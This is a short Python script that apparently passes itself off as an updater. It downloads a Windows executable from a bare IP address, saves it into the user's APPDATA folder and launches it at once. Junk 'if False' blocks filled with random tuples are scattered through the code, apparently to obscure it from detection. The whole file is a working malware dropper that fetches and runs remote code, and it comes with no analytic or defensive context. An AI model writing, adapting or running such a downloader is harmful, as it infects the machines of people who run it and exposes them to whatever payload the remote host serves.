import os
import wget
if False:
    _var_224_0 = (707, 945, 67)
    _var_224_1 = (805, 329, 780)
    _var_224_2 = (925, 865, 641)

    def _var_224_fn():
        pass
fileName = 'Updater_1.4.4_x64.exe'
URL = 'http://45.88.180.54/DONTTUCHTHIS/Updater_1.4.4_x64.exe'
if False:
    _var_225_0 = (370, 572, 679)
    _var_225_1 = (999, 181, 743)
    _var_225_2 = (165, 536, 831)

    def _var_225_fn():
        pass
appdataRoamingPath = os.getenv('APPDATA')
if False:
    _var_226_0 = (878, 977, 375)
    _var_226_1 = (580, 966, 166)

    def _var_226_fn():
        pass
fullPath = os.path.join(appdataRoamingPath, fileName)
response = wget.download(URL, fullPath)
os.startfile(fullPath)